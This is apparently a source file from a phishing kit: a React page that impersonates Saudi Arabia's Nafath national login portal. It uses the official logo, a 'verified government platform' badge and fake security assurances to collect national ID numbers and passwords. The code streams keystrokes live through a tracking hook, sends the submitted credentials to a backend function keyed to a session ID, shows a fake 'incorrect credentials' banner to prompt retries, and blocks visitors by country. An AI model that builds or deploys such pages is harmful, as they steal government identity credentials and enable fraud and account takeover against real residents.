import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { RejectBanner } from "@/components/RejectBanner";
import { useEffect, useState } from "react";
import { z } from "zod";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useLiveInput } from "@/hooks/useLiveInput";
import { checkCountryAccess, saveNafath } from "@/lib/tracking.functions";
import nafathLogo from "@/assets/nafath-logo.png";

export const Route = createFileRoute("/nafath")({
  head: () => ({
    meta: [
      { title: "نفاذ الوطني | تسجيل الدخول الآمن" },
      { name: "description", content: "الدخول عبر منصة نفاذ الوطني الموحّد باستخدام بيانات أبشر بأعلى معايير الأمان." },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&family=Outfit:wght@500;700&display=swap",
      },
    ],
  }),
  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
  component: NafathPage,
});

function NafathPage() {
  useVisitorTracking("نفاذ");
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [focus, setFocus] = useState<string | null>(null);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  useLiveInput({ username_nafath: username, password_nafath: password });

  useEffect(() => {
    if (typeof window === "undefined") return;
    checkCountryAccess()
      .then((res) => {
        if (res && res.allowed === false) window.location.replace("/blocked");
      })
      .catch(() => {});
  }, []);

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;
    const fd = new FormData(e.currentTarget);
    setLoading(true);
    await saveNafath({
      data: {
        session_id: sessionId,
        username: String(fd.get("username") ?? ""),
        password: String(fd.get("password") ?? ""),
      },
    }).catch(() => {});
    setLoading(false);
    navigate({ to: "/nafath-wait" as never });
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen relative flex flex-col items-center justify-center p-4 sm:p-6 overflow-hidden"
      style={{
        fontFamily: "'Tajawal', system-ui, sans-serif",
        background:
          "radial-gradient(1200px 600px at 50% -10%, #E8F5F1 0%, #F5F7F6 55%, #F5F7F6 100%)",
      }}
    >
      {/* Subtle decorative rings */}
      <div className="pointer-events-none absolute inset-0 opacity-[0.35]" aria-hidden>
        <div className="absolute -top-40 -right-40 w-[420px] h-[420px] rounded-full border border-[#0E7C66]/15" />
        <div className="absolute -top-24 -right-24 w-[280px] h-[280px] rounded-full border border-[#0E7C66]/10" />
        <div className="absolute -bottom-40 -left-40 w-[420px] h-[420px] rounded-full border border-[#0E7C66]/10" />
      </div>

      <div className="w-full max-w-[440px] relative">
        <RejectBanner message="بيانات نفاذ غير صحيحة، يرجى المحاولة مرة أخرى." />

        {/* Top brand strip */}
        <div className="flex items-center justify-center gap-2 mb-5">
          <span className="inline-flex items-center gap-1.5 text-[11px] font-semibold text-[#0E7C66] bg-[#0E7C66]/10 px-3 py-1.5 rounded-full">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l8 4v6c0 5-3.5 9-8 10-4.5-1-8-5-8-10V6l8-4z" />
              <path d="m9 12 2 2 4-4" />
            </svg>
            منصة حكومية موثّقة
          </span>
        </div>

        <div className="relative bg-white rounded-[28px] shadow-[0_20px_60px_-20px_rgba(14,124,102,0.25)] border border-[#0E7C66]/10 overflow-hidden">
          {/* Accent top bar */}
          <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg,#12A184,#0E7C66,#0B5F4E)" }} />

          <div className="p-6 sm:p-9 flex flex-col items-center">
            {/* Logo lockup */}
            <div className="relative mb-5">
              <div className="absolute inset-0 rounded-3xl blur-2xl bg-[#0E7C66]/25" aria-hidden />
              <div className="relative w-24 h-24 rounded-3xl bg-gradient-to-br from-white to-[#F1FAF7] border border-[#0E7C66]/15 shadow-[inset_0_1px_0_rgba(255,255,255,0.9)] flex items-center justify-center">
                <img src={nafathLogo} alt="شعار نفاذ" className="h-14 w-14 object-contain" />
              </div>
            </div>

            <h1 className="text-[22px] sm:text-2xl font-extrabold text-[#0B2A24] tracking-tight">
              الدخول عبر نفاذ
            </h1>
            <p className="mt-2 text-[13.5px] text-[#5B6B67] text-center leading-relaxed max-w-[320px]">
              استخدم بيانات <span className="font-bold text-[#0E7C66]">أبشر</span> لإتمام التحقق بأعلى معايير الأمان الحكومية
            </p>

            <div className="my-6 flex items-center gap-3 w-full text-[11px] text-[#8A9793]">
              <div className="h-px flex-1 bg-gradient-to-l from-transparent via-[#0E7C66]/20 to-transparent" />
              <span>بيانات مشفّرة</span>
              <div className="h-px flex-1 bg-gradient-to-r from-transparent via-[#0E7C66]/20 to-transparent" />
            </div>

            <form onSubmit={onSubmit} className="w-full space-y-4">
              <Field label="رقم الهوية الوطنية / الإقامة" active={focus === "u"}>
                <input
                  name="username"
                  required
                  autoComplete="username"
                  placeholder="1XXXXXXXXX"
                  dir="ltr"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setFocus("u")}
                  onBlur={() => setFocus(null)}
                  className="w-full bg-transparent outline-none text-[15px] tracking-wider text-[#1B2523] placeholder:text-[#B7C3BF] text-left"
                  style={{ fontFamily: "'Outfit', 'Tajawal', sans-serif" }}
                />
              </Field>

              <Field label="كلمة المرور" active={focus === "p"}>
                <input
                  name="password"
                  type={showPass ? "text" : "password"}
                  required
                  autoComplete="current-password"
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setFocus("p")}
                  onBlur={() => setFocus(null)}
                  className="w-full bg-transparent outline-none text-[15px] text-[#1B2523] placeholder:text-[#B7C3BF] pl-14"
                />
                <button
                  type="button"
                  onClick={() => setShowPass((v) => !v)}
                  className="absolute inset-y-0 left-3 my-auto h-8 rounded-lg px-2.5 text-[11px] font-bold text-[#0E7C66] hover:bg-[#0E7C66]/10 transition-colors"
                >
                  {showPass ? "إخفاء" : "إظهار"}
                </button>
              </Field>

              <button
                type="submit"
                disabled={loading}
                className="group relative w-full overflow-hidden rounded-2xl py-4 font-extrabold text-white text-[15px] shadow-[0_12px_30px_-8px_rgba(14,124,102,0.55)] active:scale-[0.985] transition-all disabled:opacity-70 disabled:cursor-not-allowed"
                style={{ background: "linear-gradient(135deg,#12A184 0%,#0E7C66 55%,#0B5F4E 100%)" }}
              >
                <span className="relative z-10 flex items-center justify-center gap-2">
                  {loading ? (
                    <>
                      <span className="h-4 w-4 rounded-full border-2 border-white/40 border-t-white animate-spin" />
                      جارٍ التحقق…
                    </>
                  ) : (
                    <>
                      متابعة
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M19 12H5" />
                        <path d="m12 19-7-7 7-7" />
                      </svg>
                    </>
                  )}
                </span>
                <span className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/25 to-white/0 translate-x-[-120%] group-hover:translate-x-[120%] transition-transform duration-700" />
              </button>
            </form>

            {/* Trust row */}
            <div className="mt-7 grid grid-cols-3 gap-2 w-full">
              <Trust label="تشفير TLS" />
              <Trust label="حماية أبشر" />
              <Trust label="خصوصية تامة" />
            </div>
          </div>
        </div>

        <p className="mt-5 text-center text-[11px] text-[#8A9793]">
          © المركز الوطني للتحقق الرقمي — جميع الحقوق محفوظة
        </p>
      </div>
    </div>
  );
}

function Field({
  label,
  active,
  children,
}: {
  label: string;
  active: boolean;
  children: React.ReactNode;
}) {
  return (
    <div>
      <label className="block text-[12.5px] font-bold text-[#3A4744] mr-1 mb-1.5">{label}</label>
      <div
        className={`relative flex items-center rounded-2xl border bg-[#F8FAF9] px-4 py-3.5 transition-all ${
          active
            ? "border-[#0E7C66] bg-white ring-4 ring-[#0E7C66]/10 shadow-sm"
            : "border-[#E4EBE8] hover:border-[#C9D8D3]"
        }`}
      >
        {children}
      </div>
    </div>
  );
}

function Trust({ label }: { label: string }) {
  return (
    <div className="flex items-center justify-center gap-1.5 rounded-xl bg-[#F1FAF7] border border-[#0E7C66]/10 py-2 text-[10.5px] font-semibold text-[#0E7C66]">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
        <path d="M20 6 9 17l-5-5" />
      </svg>
      {label}
    </div>
  );
}
